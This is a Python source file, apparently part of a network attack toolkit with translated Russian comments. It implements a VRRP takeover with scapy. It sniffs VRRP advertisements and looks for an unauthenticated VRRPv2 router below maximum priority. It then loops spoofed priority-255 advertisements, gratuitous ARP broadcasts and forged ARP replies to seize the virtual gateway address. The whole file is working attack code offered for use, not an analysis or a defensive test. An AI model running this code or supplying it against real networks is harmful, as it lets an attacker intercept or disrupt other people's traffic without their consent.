import time
from scapy.all import *
from scapy.layers.vrrp import VRRP, VRRPv3
from colorama import *


def vrrp_takeover(interface):
    try:
        print(Fore.YELLOW + f"    [!] Detecting VRRP routers...\n")  # Переведено
        global VRRPv2_with_non_auth_captured
        VRRPv2_with_non_auth_captured = False  # Не захвачен

        def vrrp_adv_reply(packet):
            global src_ip, virtual_mac, advert_interval, VRRPv2_with_non_auth_captured, virtual_rid, virtual_ip
            if packet.haslayer(VRRPv3):  # Если это VRRPv3
                virtual_mac = packet[Ether].src
                src_ip = packet[IP].src
                version = packet[VRRPv3].version
                virtual_rid = packet[VRRPv3].vrid
                priority = packet[VRRPv3].priority
                if priority == 255:
                    output_priority = f"{Fore.RED}255 (max){Fore.GREEN}"
                else:
                    output_priority = priority
                advert_interval = packet[VRRPv3].adv
                output_auth = "None"
                virtual_ip = packet[VRRPv3].addrlist

                print(Fore.GREEN + f"    [+] [VRRP Router detected]\n         MAC: {virtual_mac.upper()}\n"
                                   f"         IP: {src_ip}\n         Version: {Fore.RED}{version} (Temporarily unsupported){Fore.GREEN}\n"
                                   f"         Virtual Router ID: {virtual_rid}\n         Priority: {output_priority}\n         Advertisement Interval: {advert_interval} (cs)\n         Auth: {output_auth}\n"
                                   f"         Virtual IP Address: {virtual_ip}\n")  # Переведено
                return True

            if packet.haslayer(VRRP):  # Если это VRRPv2
                virtual_mac = packet[Ether].src
                src_ip = packet[IP].src
                version = packet[VRRP].version
                virtual_rid = packet[VRRP].vrid
                virtual_ip = packet[VRRP].addrlist
                priority = packet[VRRP].priority
                if priority == 255:
                    output_priority = f"{Fore.RED}255 (max){Fore.GREEN}"
                else:
                    output_priority = priority
                advert_interval = packet[VRRP].adv
                auth = packet[VRRP].authtype
                if auth == 1:
                    output_auth = f"{Fore.RED}Plain Text (Temporarily unsupported){Fore.GREEN}"
                elif auth == 254:
                    output_auth = f"{Fore.RED}MD5 (Temporarily unsupported){Fore.GREEN}"
                elif auth == 0:
                    output_auth = "None"

                if priority < 255 and auth == 0:
                    VRRPv2_with_non_auth_captured = True

                print(Fore.GREEN + f"    [+] [VRRP Router detected]\n         MAC: {virtual_mac.upper()}\n         IP: {src_ip}\n         Version: {version}\n"
                                 f"         Virtual Router ID: {virtual_rid}\n         Priority: {output_priority}\n         Advertisement Interval: {advert_interval} (sec)\n         Auth: {output_auth}\n"
                                 f"         Virtual IP Address: {virtual_ip}\n")  # Переведено
                return True

        sniffer = AsyncSniffer(filter="ip proto 112", iface=interface, prn=lambda x: None, stop_filter=vrrp_adv_reply, timeout=10)
        sniffer.start()
        time.sleep(11)

        def send_vrrp_packets():
            global virtual_ip, virtual_mac, advert_interval, virtual_rid
            total = 0
            try:
                while True:
                    fake_vrrp_advertisement = Ether(src=virtual_mac, dst="01:00:5e:00:00:12") / \
                                              IP(dst="224.0.0.18", ttl=255) / \
                                              VRRP(version=2, type=1, vrid=virtual_rid, priority=255, authtype=0,
                                                   adv=advert_interval, addrlist=virtual_ip)

                    sendp(fake_vrrp_advertisement, iface=interface, count=1, verbose=False)
                    total += 1
                    print(Fore.GREEN + f"    [+] Sent spoofed VRRP Advertisement packets: {total}", end="\r")  # Переведено
                    time.sleep(advert_interval)

            except KeyboardInterrupt:
                print(Fore.YELLOW + f"    [!] Attack stopped (User pressed Ctrl + C)")  # Переведено

        def send_garp_frames():
            try:
                print(Fore.GREEN + f"    [+] Gratuitous ARP sent")  # Переведено
                while True:
                    gratuitous_arp = Ether(src=virtual_mac, dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, hwsrc=virtual_mac, hwdst="ff:ff:ff:ff:ff:ff", psrc=virtual_ip, pdst=virtual_ip)
                    sendp(gratuitous_arp, iface=interface, count=1, verbose=False)
                    time.sleep(10)

            except KeyboardInterrupt:
                print(Fore.YELLOW + f"    [!] Attack stopped (User pressed Ctrl + C)")  # Переведено

        def send_arp_frames():
            def packet_analyze(packet):
                if packet[ARP].hwsrc != virtual_mac and packet[ARP].pdst in virtual_ip:
                    client_mac = packet[Ether].src
                    client_ip = packet[ARP].psrc

                    arp_response = Ether(src=virtual_mac, dst=client_mac) / ARP(op=2, hwsrc=virtual_mac, hwdst=client_mac, psrc=virtual_ip, pdst=client_ip)
                    sendp(arp_response, iface=interface, count=1, verbose=False)

            sniffer = AsyncSniffer(filter="arp", iface=interface, prn=packet_analyze)
            sniffer.start()

        if VRRPv2_with_non_auth_captured == True:
            Thread(target=send_vrrp_packets, daemon=False).start()
            Thread(target=send_garp_frames, daemon=False).start()
            Thread(target=send_arp_frames, daemon=False).start()

        else:
            print(Fore.RED + f"    [-] %ERROR: No VRRPv2 routers detected (attack aborted)")  # Переведено
            print(Fore.RED + f"    [-] %ERROR: Possible VRRP routers using AUTHENTICATION, MAX PRIORITY, or unsupported VRRP VERSION")  # Переведено

    except KeyboardInterrupt:
        print(Fore.YELLOW + f"    [!] Attack stopped (User pressed Ctrl + C)")  # Переведено